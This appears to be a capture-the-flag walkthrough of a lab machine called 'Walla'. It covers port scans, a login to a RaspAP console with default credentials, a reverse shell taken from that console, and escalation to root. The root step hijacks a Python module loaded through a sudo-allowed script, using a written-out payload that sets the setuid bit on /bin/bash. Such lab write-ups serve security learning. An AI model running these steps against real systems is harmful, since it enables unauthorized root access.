# Walla

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.97
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 22:22 +08
Nmap scan report for 192.168.197.97
Host is up (0.17s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
422/tcp   open  ariel3
8091/tcp  open  jamlink
42042/tcp open  unknown
```

Telnet is enabled, which is always great. Ran a detailed `nmap` scan too:

```
$ sudo nmap -p 22,23,25,53,422,8091,42042 -sC -sV -O --min-rate 3000 192.168.197.97
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 22:24 +08
Nmap scan report for 192.168.197.97
Host is up (0.17s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
```

### Weak Creds -> Web Console

I took a look at port 8081 first, and found that it had a HTTP login:

<figure><img src="../../../.gitbook/assets/image (3987).png" alt=""><figcaption></figcaption></figure>

We can login with `admin:secret` and view the dashboard:

<figure><img src="../../../.gitbook/assets/image (3657).png" alt=""><figcaption></figcaption></figure>

This is running RaspAP, which is a wireless router software. We can find the version by heading to 'About RaspAP':

<figure><img src="../../../.gitbook/assets/image (3942).png" alt=""><figcaption></figcaption></figure>

There are RCE exploits for this:

```
$ searchsploit raspap       
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
RaspAP 2.6.6 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50224.py
----------------------------------------------------------- ---------------------------------
```

However, we don't actually need any exploits because within the 'System' tab, there's a Console present:

<figure><img src="../../../.gitbook/assets/image (3749).png" alt=""><figcaption></figcaption></figure>

A reverse shell is trivial:

<figure><img src="../../../.gitbook/assets/image (1830).png" alt=""><figcaption></figcaption></figure>

Grab the user flag from the home directory of `walter`.

## Privilege Escalation

### Sudo Privileges -> Module RCE

I ran a `linpeas.sh` scan to enumerate for me. Here's the interesting output:

```
User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
    
[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d 
You have write privileges over /lib/systemd/system/raspapd.service
```

The `wifi_reset.py` file looks the easiest to exploit:

```
www-data@walla:/home/walter$ cat wifi_reset.py 
#!/usr/bin/python

import sys

try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")
```

This is pretty easy to exploit. We can create a script `wificontroller.py` and place it within the `/home/walter` directory. Here's the contents of it:

```python
import os
os.system("chmod u+s /bin/bash")
```

Then, we can attempt to run the `wifi_reset.py` script and easily get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (2079).png" alt=""><figcaption></figcaption></figure>
